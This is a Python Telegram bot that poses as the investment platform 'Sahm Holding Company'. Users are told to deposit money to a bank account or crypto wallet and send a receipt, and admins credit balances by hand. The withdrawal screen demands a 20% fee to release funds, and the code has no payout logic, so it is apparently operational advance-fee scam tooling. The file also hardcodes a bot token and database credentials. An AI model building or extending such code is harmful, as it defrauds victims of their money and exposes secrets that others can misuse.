import logging
import os
import urllib.parse
from flask import Flask
from threading import Thread
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 🌐 خادم الويب (إجباري لاستقرار السيرفر) ---
app_web = Flask('')
@app_web.route('/')
def home(): return "🚀 Sahm Platform is Online"

def run_server():
    app_web.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

# إعداد السجلات
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= [ ⚙️ إعدادات الإمبراطور ] =================
TOKEN = '8731999916:AAHdeigVSmil8KD6GeA7OazVZkjVxhq9QJU'
ADMIN_USERNAME = 'HCICICVICIF9'
ADMINS_LIST = [6016547718]

# الربط الذهبي (تم تعديله بناءً على صورتك ليكون Admin Source)
u = urllib.parse.quote_plus('Abduh')
p = urllib.parse.quote_plus('Abduh2026')
MONGO_URI = f"mongodb+srv://{u}:{p}@cluster0.0a4wefx.mongodb.net/investment_platform?authSource=admin&retryWrites=true&w=majority"

BANK_ACCOUNT = "SA0000000000000000000000"
CRYPTO_WALLET = "TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA"

PRICES_SAR = ["1000", "1500", "2000", "3000", "5000", "7000", "8000", "10000", "15000", "20000", "30000", "50000"]
PRICES_USD = ["300", "400", "500", "600", "800", "1000", "2000", "3000", "5000", "20000", "30000"]
# ===============================================================

try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client['investment_platform']
    users_col = db['users']
    client.admin.command('ping')
    logger.info("✅ تم الاتصال بسحابة MongoDB بنجاح")
except Exception as e:
    logger.error(f"❌ فشل الاتصال بالمونغو: {e}")

def get_user_data(uid):
    user = users_col.find_one({"uid": uid})
    if not user:
        user = {"uid": uid, "bal_sar": 0.0, "bal_usd": 0.0}
        users_col.insert_one(user)
    return user

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user_data(user.id)
    kb = [
        [InlineKeyboardButton("🇸🇦 استثمار (بالريال السعودي)", callback_data='c_sr'),
         InlineKeyboardButton("🇺🇸 استثمار (بالدولار)", callback_data='c_us')],
        [InlineKeyboardButton("💰 محفظتي المالية", callback_data='wallet')],
        [InlineKeyboardButton("📤 طلب سحب الأرباح", callback_data='withdraw')],
        [InlineKeyboardButton("💬 التواصل مع الإدارة", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]
    text = f"🏦 **مرحباً بك في شركة سهم القابضة**\n\nالسيد: {user.first_name}\nاختر القسم المطلوب للبدء:"
    if update.message: await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    else: await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    uid = query.from_user.id
    await query.answer()

    if data == 'main': await start(update, context)
    elif data == 'wallet':
        u = get_user_data(uid)
        await query.edit_message_text(f"📊 **محفظتك:**\n\n🇸🇦: `{u['bal_sar']:,}` ﷼\n🇺🇸: `{u['bal_usd']:,}` $", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]), parse_mode='Markdown')
    elif data == 'withdraw':
        u = get_user_data(uid)
        msg = f"📤 **طلب سحب الأرباح**\n\nرصيدك الحالي:\n🇸🇦: {u['bal_sar']} ﷼\n🇺🇸: {u['bal_usd']} $\n\n💡 الرسوم (20%) لفتح بوابة التحويل."
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]), parse_mode='Markdown')
    elif data in ['c_sr', 'c_us']:
        curr = 'sr' if data == 'c_sr' else 'us'
        prices = PRICES_SAR if curr == 'sr' else PRICES_USD
        btns = [[InlineKeyboardButton(f"{p} {('﷼' if curr=='sr' else '$')}", callback_data=f"{curr[0]}_{p}") for p in prices[i:i+2]] for i in range(0, len(prices), 2)]
        btns.append([InlineKeyboardButton("🔙", callback_data='main')])
        await query.edit_message_text("🏦 اختر مبلغ الاستثمار:", reply_markup=InlineKeyboardMarkup(btns))
    elif data.startswith(('s_', 'u_')):
        amt = data.split('_')[1]
        addr = BANK_ACCOUNT if data.startswith('s_') else CRYPTO_WALLET
        await query.edit_message_text(f"✅ تم اختيار {amt}\nحول إلى:\n`{addr}`\n\n📸 أرسل الإيصال هنا.", parse_mode='Markdown')
    elif data.startswith('ok_'): # زر التأكيد للمالك
        if uid not in ADMINS_LIST: return
        try:
            _, cur, val, tid = data.split('_')
            field = "bal_sar" if cur == 'sr' else "bal_usd"
            users_col.update_one({"uid": int(tid)}, {"$inc": {field: float(val)}})
            await query.edit_message_caption(f"✅ تم تأكيد إيداع {val} {cur}")
            await context.bot.send_message(int(tid), f"🎉 تم إيداع {val} في محفظتك!")
        except: await query.answer("❌ خطأ في الإيداع")
    elif data.startswith('no_'): # زر الرفض
        if uid not in ADMINS_LIST: return
        tid = data.split('_')[1]
        await query.edit_message_caption("❌ تم رفض الإيصال")
        try: await context.bot.send_message(int(tid), "❌ نعتذر، تم رفض الإيصال.")
        except: pass

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text("✅ جاري مراجعة الإيصال...")
    def b(v, c): return InlineKeyboardButton(f"➕ {v} {('ر' if c=='sr' else '$')}", callback_data=f"ok_{c}_{v}_{user.id}")
    kb = [
        [b("1000", "sr"), b("1500", "sr")], [b("2000", "sr"), b("3000", "sr")],
        [b("5000", "sr"), b("10000", "sr")], [b("300", "us"), b("1000", "us")],
        [InlineKeyboardButton("❌ رفض الإيصال", callback_data=f"no_{user.id}")]
    ]
    for adm in ADMINS_LIST:
        try: await context.bot.send_photo(adm, update.message.photo[-1].file_id, caption=f"🔔 من: {user.first_name}\nID: `{user.id}`", reply_markup=InlineKeyboardMarkup(kb))
        except: pass

if __name__ == '__main__':
    Thread(target=run_server, daemon=True).start()
    app = Application.builder().token(TOKEN).concurrent_updates(True).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.run_polling(drop_pending_updates=True)
